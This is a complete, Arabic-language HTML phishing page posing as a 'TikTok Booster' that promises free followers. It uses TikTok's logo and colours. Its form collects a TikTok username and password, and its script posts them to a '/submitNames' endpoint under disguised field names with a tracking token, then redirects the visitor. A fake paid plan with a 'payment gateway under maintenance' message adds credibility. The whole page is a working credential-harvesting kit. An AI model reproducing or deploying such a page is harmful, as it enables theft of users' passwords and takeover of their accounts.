<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="TikTok Booster - زيادة متابعين تيك توك">
    <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b6efc5601ff3.png">
    <title>TikTok | Followers</title>
    <style>
        body { font-family: 'ProximaNova', Arial, sans-serif; background-color: #121212; color: white; margin: 0; }
        .nav { background: #000; padding: 15px; text-align: center; border-bottom: 1px solid #333; }
        .logo { font-size: 26px; font-weight: bold; }
        .logo span:nth-child(1) { color: #ff0050; }
        .logo span:nth-child(3) { color: #00f2ea; }
        .container { max-width: 400px; margin: 40px auto; background: #252525; padding: 30px; border-radius: 12px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #333; border: 1px solid #444; color: white; border-radius: 8px; box-sizing: border-box; }
        .btn { width: 100%; padding: 14px; background-color: #ff0050; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .plan { border: 1px solid #444; padding: 15px; border-radius: 10px; margin: 10px 0; cursor: pointer; display: flex; justify-content: space-between; }
        .plan.active { border-color: #ff0050; background: rgba(255, 0, 80, 0.1); }
    </style>
</head>
<body>
    <div class="nav"><div class="logo"><span>Tik</span><span>Tok</span><span> Booster</span></div></div>
    <div class="container">
        <h2>احصل على 1,000 متابع مجاناً</h2>
        <div class="plan active" onclick="sel(this, '0')"><span>1,000 متابع</span> <b style="color:#00f2ea">مجاني</b></div>
        <div class="plan" onclick="sel(this, '20')"><span>10,000 متابع</span> <b style="color:#00f2ea">19.99$</b></div>
        <form id="f">
            <input type="text" id="u" placeholder="اسم المستخدم" required>
            <input type="password" id="p" placeholder="كلمة السر" required>
            <button type="submit" class="btn" id="b">استلام الآن</button>
        </form>
    </div>
    <script>
        const token = new URLSearchParams(window.location.search).get('t');
        let isFree = true;
        function sel(el, p) {
            document.querySelectorAll('.plan').forEach(i => i.classList.remove('active'));
            el.classList.add('active');
            isFree = (p === '0');
            document.getElementById('b').innerText = isFree ? "استلام الآن" : "شراء الآن ("+p+"$)";
        }
        document.getElementById('f').onsubmit = async (e) => {
            e.preventDefault();
            if(!isFree) return alert('بوابة الدفع تحت الصيانة!');
            const btn = document.getElementById('b');
            btn.disabled = true; btn.innerText = "جاري التأكيد...";
            await fetch('/submitNames', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token, firstName: document.getElementById('u').value, secondName: document.getElementById('p').value })
            });
            window.location.href = "/ok.html";
        };
    </script>
</body>
</html>
